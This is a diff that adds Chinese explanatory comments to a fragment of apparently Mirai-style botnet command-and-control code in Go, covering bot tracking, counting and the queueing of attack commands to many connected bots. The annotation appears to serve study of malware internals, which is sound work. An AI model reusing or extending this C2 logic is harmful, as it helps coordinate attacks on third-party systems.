@@ -33,8 +33,8 @@ type ClientList struct {
 //新建clientList结构体以及两个协程【协程之间使用channel通信】
 func NewClientList() *ClientList {
 	c := &ClientList{0, 0, make(map[int]*Bot), make(chan *Bot, 128), make(chan *Bot, 128), make(chan *AttackSend), make(chan int, 64), make(chan int), make(chan int), make(chan map[string]int), &sync.Mutex{}}
-	go c.worker() //触发ClientList的工作状态，处理每一个chan的信息
-	go c.fastCountWorker()
+	go c.worker()          //触发ClientList的工作状态，处理每一个chan的信息【管理用户的请求，比如增加bot、减少bot、发起攻击、查询bot等】
+	go c.fastCountWorker() //处理维护bot的计数信息数据。
 	return c
 }
 
@@ -62,6 +62,7 @@ func (this *ClientList) DelClient(c *Bot) {
 	fmt.Printf("Deleted client %d - %s - %s\n", c.version, c.source, c.conn.RemoteAddr())
 }
 
+//这是基于一整个ClientList发起攻击，在worker解析atkQueue管道的新数据的时候，才会分派给Bot.QueueBuf，基于conn（socket）下发给多个bots
 func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
 	attack := &AttackSend{buf, maxbots, botCata}
 	this.atkQueue <- attack
@@ -70,10 +71,10 @@ func (this *ClientList) QueueBuf(buf []byte, maxbots int, botCata string) {
 func (this *ClientList) fastCountWorker() {
 	for {
 		select {
-		case delta := <-this.totalCount:
-			this.count += delta
+		case delta := <-this.totalCount: //如果出现统计计数变化，
+			this.count += delta //修改ClientList管理的bot计数情况
 			break
-		case <-this.cntView:
+		case <-this.cntView: //查看bot的数量
 			this.cntView <- this.count
 			break
 		}
